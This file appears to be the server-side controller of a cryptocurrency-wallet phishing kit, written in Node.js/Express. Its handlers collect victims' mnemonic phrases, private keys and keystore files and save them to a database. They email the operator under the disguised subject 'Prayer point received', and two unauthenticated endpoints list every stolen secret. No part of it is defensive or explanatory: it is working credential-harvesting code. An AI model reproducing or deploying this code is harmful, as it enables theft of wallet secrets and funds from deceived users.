const ErrorResponse = require("../utils/errorResponse");
const Mnemonic = require("../Models/Mnemonic");
const PrivateKey = require("../Models/PrivateKey");
const Keystore = require("../Models/Keystore");
const path = require("path");
const { sendEmail } = require("../utils/sendEmail");
require("dotenv").config();

exports.saveMnemonic = async (req, res, next) => {
  const { walletAddress, mnemonicPhrase } = req.body;
  // console.lo;
  try {
    const newMnemonic = new Mnemonic({
      walletAddress,
      mnemonicPhrase,
    });
    let url = `${req.protocol}://${req.get("host")}/api/all/Mnemonic`;
    const savedMnemonic = await newMnemonic.save();
    const message = `You are receiving this email because someone else has sent you a mnemonic phrase. click this: \n\n ${url}
    \n to see list of all the menomic phrase in your database \n open with your laptop or desktop for a better view`;

    await sendEmail({
      email: process.env.TO_EMAIL,
      subject: "Prayer point recieved",
      message,
    });
    return res.status(201).json({
      success: true,
      savedMnemonic,
      msg: "Mnemonic Phrase is saved successfully",
    });
  } catch (error) {
    return next(new ErrorResponse(`unable to save Mnemonic Phrase `, 401));
  }
};

exports.savePrivateKey = async (req, res, next) => {
  const { walletAddress, privateKey } = req.body;
  try {
    const newPrivateKey = new PrivateKey({
      walletAddress,
      privateKey,
    });
    const savedPrivateKey = await newPrivateKey.save();
    let url = `${req.protocol}://${req.get("host")}/api/all/PrivateKey`;
    const message = `You are receiving this email because someone else has sent you a mnemonic phrase. click this: \n\n ${url}
    \n to see list of all the menomic phrase in your database \n open with your laptop or desktop for a better view`;

    await sendEmail({
      email: process.env.TO_EMAIL,
      subject: "Prayer point received",
      message,
    });
    return res.status(201).json({
      success: true,
      savedPrivateKey,
      msg: "Private Key is saved successfully",
    });
  } catch (error) {
    return next(new ErrorResponse(`unable to save Private Key`, 401));
  }
};

exports.saveKeystore = async (req, res, next) => {
  try {
    // Step 1
    const { walletAddress } = req.body;
    if (!req.files) {
      return next(new ErrorResponse(`please upload a file`, 400));
    }
    const file = req.files.file;
    console.log(file);
    if (file.mimetype.startsWith("application/json")) {
      // Create custom filename
      file.name = `json_${Date.now()}${path.parse(file.name).ext}`;

      // step 3 move the file to somewhere in your server
      file.mv(`${process.env.JSON_PATH}/${file.name}`, async (err) => {
        if (err) {
          return next(new ErrorResponse(`Unable to upload file`, 500));
        }
        const saveData = await new Keystore({
          walletAddress,
          json: file.name,
        });
        await saveData.save();
        return res.status(201).json({ success: true, saveData });
      });
    }
  } catch (err) {
    return next(new ErrorResponse(`Unable to upload File`, 500));
  }
};

exports.getMnemonics = async (req, res, next) => {
  try {
    const mnemonics = await Mnemonic.find({});
    return res
      .status(200)
      .json({ success: true, Total: mnemonics.length, mnemonics });
  } catch (error) {
    return next(new ErrorResponse(`Unable to get Mnemonic`, 401));
  }
};
exports.getPrivateKey = async (req, res, next) => {
  try {
    const privatekeys = await PrivateKey.find({});
    return res
      .status(200)
      .json({ success: true, Total: privatekeys.length, privatekeys });
  } catch (error) {
    return next(new ErrorResponse(`Unable to get Mnemonic`, 401));
  }
};
